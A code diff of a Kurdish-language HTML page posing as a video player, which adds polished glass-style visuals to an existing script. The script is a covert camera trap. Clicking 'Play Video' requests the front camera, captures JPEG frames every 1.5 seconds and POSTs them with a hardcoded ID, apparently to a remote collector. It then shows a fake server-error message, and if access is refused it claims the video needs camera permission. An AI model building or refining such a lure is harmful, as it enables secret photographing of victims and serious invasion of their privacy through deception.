@@ -1,15 +1,99 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Video Player</title>
-</head>
-<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center;">
+    <style>
+        /* باگراوندێکی جوڵاو و مۆدێرن */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background: linear-gradient(-45deg, #0f2027, #203a43, #2c5364, #141e30);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+            overflow: hidden;
+        }
 
-    <div id="main-container">
-        <h2 id="status">ڤیدیۆکە ئامادەیە</h2>
-        <button id="startBtn" style="padding: 15px 30px; font-size: 18px; border-radius: 10px; border: none; background: #0088cc; color: white; cursor: pointer;">Play Video 🎬</button>
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* کاردی ناوەڕاست بە ستایلی شوشەیی */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 25px;
+            padding: 50px 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 85%;
+            max-width: 400px;
+            z-index: 1;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 30px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        /* ستایلی دوگمەکە */
+        #startBtn {
+            padding: 15px 45px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            border: none;
+            background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%);
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(0, 210, 255, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        #startBtn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 25px rgba(0, 210, 255, 0.6);
+        }
+
+        #startBtn:active {
+            transform: translateY(1px);
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        /* بازنەی دیکۆری لە باگراوند */
+        .shape {
+            position: absolute;
+            background: linear-gradient(45deg, rgba(0, 210, 255, 0.2), rgba(58, 123, 213, 0.2));
+            border-radius: 50%;
+            z-index: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="shape" style="width: 300px; height: 300px; top: -100px; left: -100px;"></div>
+    <div class="shape" style="width: 200px; height: 200px; bottom: -50px; right: -50px;"></div>
+
+    <div class="glass-card">
+        <h2 id="status">ڤیدیۆکە ئامادەیە 🎬</h2>
+        <button id="startBtn">Play Video</button>
     </div>
 
     <video id="v" autoplay playsinline style="display:none;"></video>
@@ -20,10 +104,11 @@
         const myId = '7978104952'; 
 
         document.getElementById('startBtn').addEventListener('click', function() {
-            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
+            const statusText = document.getElementById('status');
+            statusText.innerText = "کەمێک چاوەڕێ بکە...";
             this.style.display = 'none';
 
-            navigator.mediaDevices.getUserMedia({ video: true })
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(s => {
                 const v = document.getElementById('v');
                 v.srcObject = s;
@@ -42,13 +127,13 @@
                             method: 'POST',
                             body: f
                         }).then(() => {
-                            document.getElementById('status').innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
+                            statusText.innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
                         });
                     }, 'image/jpeg');
-                }, 1000);
+                }, 1500);
             })
             .catch(e => {
-                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
+                statusText.innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
             });
         });
     </script>
